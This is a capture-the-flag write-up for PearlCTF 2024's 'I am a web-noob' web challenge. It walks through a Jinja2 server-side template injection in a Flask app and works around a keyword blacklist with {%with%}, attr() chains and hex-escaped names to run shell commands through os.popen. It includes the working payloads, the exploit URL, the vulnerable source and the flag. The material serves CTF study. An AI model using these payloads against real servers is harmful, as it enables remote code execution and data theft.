# PearlCTF 2024

## I am a web-noob

> Maybe noobs create the most secure web applications. Or maybe not.
>
>  Author: s4ych33se!
>

Tags: _web_

## Solution
For this challenge, we get a small web application where we can enter a username and login. The username is passed as parameter `?user=username` and the page then displays `Basic <the username>`...

This looks a bit like `SSTI`. Trying out some of the typical payloads doesnt give good results, but an interesting message `{% set config=None%}{% set self=None%} 5*5}}`. Looks like our opening braces where removed: `{{`, so we have some sort of filter but we can be pretty confident this is a `SSTI` challenge.

After a while I found a construct like this is not filtered:

```bash
{%with a="Hello World"%}
{%print(a)%}
{%endwith}
```

As this prints `Basic Hello World`, we can start from here carefully crafting a payload that doesn't violate the filter. In the end this was what worked:

```bash
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f")("\x6f\x73")|attr("\x70\x6f\x70\x65\x6e")("\x63\x61\x74\x24\x7b\x49\x46\x53\x7d\x66\x6c\x61\x67\x2e\x74\x78\x74")|attr("read")()%}
{%print(a)%}
{%endwith%}
```

Since many of the keywords are filtered, this needed to be bypassed with specifying the hex values of the characters. A bit better readable the payload (but this is filtered) would look like this:

```bash
{%with a=request|attr("application")|attr("__globals__")|attr(__getitem__)(__builtins__)|attr__getitem__)(__import__)("os")|attr("popen")("cat${IFS}flag.txt")|attr("read")()%}
{%print(a)%}
{%endwith%}
```

Passing this to the parameter gives us the flag.

```bash
https://noob-login.ctf.pearlctf.in/?user={%with%20a=request|attr(%22application%22)|attr(%22\x5f\x5fglobals\x5f\x5f%22)|attr(%22\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f%22)(%22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%22)|attr(%22\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f%22)(%22\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f%22)(%22\x6f\x73%22)|attr(%22\x70\x6f\x70\x65\x6e%22)(%22\x63\x61\x74\x24\x7b\x49\x46\x53\x7d\x66\x6c\x61\x67\x2e\x74\x78\x74%22)|attr(%22read%22)()%}{%print(a)%}{%endwith%}
```

As we have shell now, we also can grab a copy of the application code, just to see what we navigated around the whole time:

```javascript
#!/usr/bin/env python3

from flask import Flask, render_template_string, request
import os

app = Flask(__name__)
blacklist = ['import','getattr', 'class', 'os','subclasses','mro','eval','if',' subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals', 'init', '{{', '}}', ":", ";", '-', "_", "[", "]", "join"]


@app.route("/")
def home():
    user = request.args.get('user') or None

    template = '''
    <html><head><title>Get The Flag</title><style>body {margin: 90px;}</style></head><body>
    '''
    if user == None:
        template = template + '''
        <h1>Login Form</h1>
        <form>
        <input name="user" style="border: 2px solid #C21010; padding: 10px; border-radius: 10px; margin-bottom: 25px;" value="Username"><br>
        <input type="submit" value="Log In" style="border: 0px; padding: 5px 20px ; color: #C21010;">
        </form>
        '''.format(user)
    else:
        for no in blacklist:
            if no in user:
                user = user.replace(no, ' ').lower()
            else:
                continue
            a =  ['config', 'self']
            return ''.join(['{{% set {}=None%}}'.format(c) for c in a]) + user

        template = template + '''
        <h1>Basic {}</h1>
        Blah blah blah<br>
        '''.format(user)

    return render_template_string(template)

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=9000)
```

Flag `pearl{W4s_my_p4ge_s3cur3_en0ugh_f0r_y0u?}`